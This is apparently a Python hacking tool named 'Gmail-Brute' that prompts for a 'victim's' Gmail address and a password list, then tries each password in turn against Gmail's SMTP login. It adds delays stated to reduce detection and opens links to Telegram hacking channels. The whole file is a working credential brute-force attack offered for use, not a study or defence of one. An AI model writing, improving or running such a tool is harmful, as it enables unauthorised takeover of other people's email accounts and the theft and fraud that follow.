import smtplib
import os
import sys
import time
import threading
import webbrowser  # This module allows opening links in the default web browser

# Color codes for rainbow effect
red = '\033[31m'
yellow = '\033[93m'
green = '\033[92m'
blue = '\033[94m'
cyan = '\033[96m'
magenta = '\033[35m'
white = '\033[97m'
reset = '\033[0m'

# Function to print logo with a consistent color
def print_logo():
    color = cyan  # You can choose any color you prefer (cyan is used here)
    print(f"{color}███╗░░░███╗██████╗░░░░")
    print(f"{color}████╗░████║██╔══██╗░░░")
    print(f"{color}██╔████╔██║██████╔╝░░░")
    print(f"{color}██║╚██╔╝██║██╔══██╗░░░")
    print(f"{color}██║░╚═╝░██║██║░░██║██╗")
    print(f"{color}╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝")
    print(f"{color}██████╗░███████╗██████╗░██╗████████╗")
    print(f"{color}██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝")
    print(f"{color}██████╔╝█████╗░░██████╦╝██║░░░██║░░░")
    print(f"{color}██╔══██╗██╔══╝░░██╔══██╗██║░░░██║░░░")
    print(f"{color}██║░░██║███████╗██████╦╝██║░░░██║░░░")
    print(f"{color}╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝░░░╚═╝░░░")
    print(f"{reset}")

# Function to print bordered text
def print_bordered_text():
    border_color = cyan
    content_color = green
    
    # Borders around the content
    border = "*" * 50
    print(f"{border_color}{border}")
    print(f"{border_color}*{content_color}\t\tCoded By U-danbaiwa\t\t{border_color}*")
    print(f"{border_color}*{content_color}\t\tGmail-Brute\t\t{border_color}*")
    print(f"{border_color}*{content_color}\t\t\tV1.1\t\t\t{border_color}*")
    print(f"{border_color}{border}")
    print(f"{reset}")

# Check if figlet is installed
def check_figlet():
    return os.system("which figlet > /dev/null 2>&1") == 0

# Clear screen and print title
os.system("clear")
if check_figlet():
    os.system("figlet Gmail-Brute")
else:
    print(green + "Gmail-Brute")

# Display the new logo
print_logo()

# Display the bordered text
print_bordered_text()

# Function to check login with a password
def try_login(victim, password):
    try:
        # Gmail login (replace with valid authentication method)
        gmail.login(victim, password)
        print(green + "PASSWORD FOUND!<===> %s" % password)  # Print the matching password in GREEN
        return True
    except smtplib.SMTPAuthenticationError:
        print(red + "PASSWORD INCORRECT<===> %s" % password)  # Print incorrect password in RED
        return False
    except Exception as e:
        print(red + "Error: " + str(e))  # Print error in RED
        return False

# Function to handle login attempts
def attempt_login(victim, password_file):
    try:
        with open(password_file, "r") as passwords:
            for password in passwords:
                password = password.strip()  # Remove any newline or extra spaces
                time.sleep(1)  # Adjust the sleep to control speed (add delay to reduce detection)
                if try_login(victim, password):
                    break
    except FileNotFoundError:
        print(red + "Password file not found!")
    except Exception as e:
        print(red + "Error: " + str(e))

# Initialize the SMTP connection
gmail = smtplib.SMTP("smtp.gmail.com", 587)
gmail.ehlo()
gmail.starttls()

# Main function to manage the login process
def main():
    try:
        # This is the part where the input will be green (ENTER GMAIL ACCOUNT)
        victim = input(f"{green}Give Your Victim's Gmail: {reset}")  # Set input prompt in green color
        print(yellow + "\nloading...")
        time.sleep(2)
        print(green + "verified!")
        print("")
        
        # Open the Telegram channel in the default web browser after Gmail input
        print(cyan + "Redirecting to our Telegram channel...")
        time.sleep(1)
        webbrowser.open("https://t.me/THE_OFFICIAL_HACKING_WORLD")  # Open Telegram link in the default browser
        
        password_file = input("ENTER PASSWORD LIST: ")
        print("")
        
        # Open the Telegram channel again after password list input
        print(cyan + "Redirecting to our Telegram channel again...")
        time.sleep(1)
        webbrowser.open("https://t.me/TEAMBDDARKFORSC")  # Open Telegram link in the default browser
        
        print(cyan + "please wait...")
        time.sleep(2)
        
        # Start the login attempt in a separate thread
        login_thread = threading.Thread(target=attempt_login, args=(victim, password_file))
        login_thread.start()
        login_thread.join()  # Wait for the thread to finish before continuing
        
        print(cyan + "\t\t\tThank You\n\n")

    except Exception as e:
        print(red + "\t\tSOMETHING WRONG!!!\n", str(e))

if __name__ == "__main__":
    main()